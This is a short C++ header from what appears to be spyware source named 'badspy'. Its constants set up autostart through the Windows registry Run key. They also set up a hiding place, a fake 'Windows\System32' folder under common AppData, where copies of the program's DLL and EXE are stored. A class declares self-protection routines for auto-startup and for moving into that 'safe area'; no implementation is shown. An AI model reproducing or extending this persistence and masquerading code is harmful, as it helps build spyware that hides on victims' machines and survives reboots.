#pragma once

#define SPY_SHD_AUTOBOOT_HKEY			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define SPY_SHD_AUTOBOOT_APPNAME		"badspy"
#define SPY_SHD_SAFEAREA_DIR			CSIDL_COMMON_APPDATA
#define SPY_SHD_SAFEAREA_SUBDIR			"Windows\\System32"
#define SPY_SHD_SAFEAREA_DST_DLLNAME	"badspy.c.dll"
#define SPY_SHD_SAFEAREA_DST_EXENAME	"badspy.m.exe"
#define SPY_SHD_SAFEAREA_SRC_DLLNAME	"badspy.c.dll"
#define SPY_SHD_SAFEAREA_SRC_EXENAME	"badspy.m.exe"

class SelfPrt
{
public:
	static void auto_startup();
	static bool move_to_safearea();
};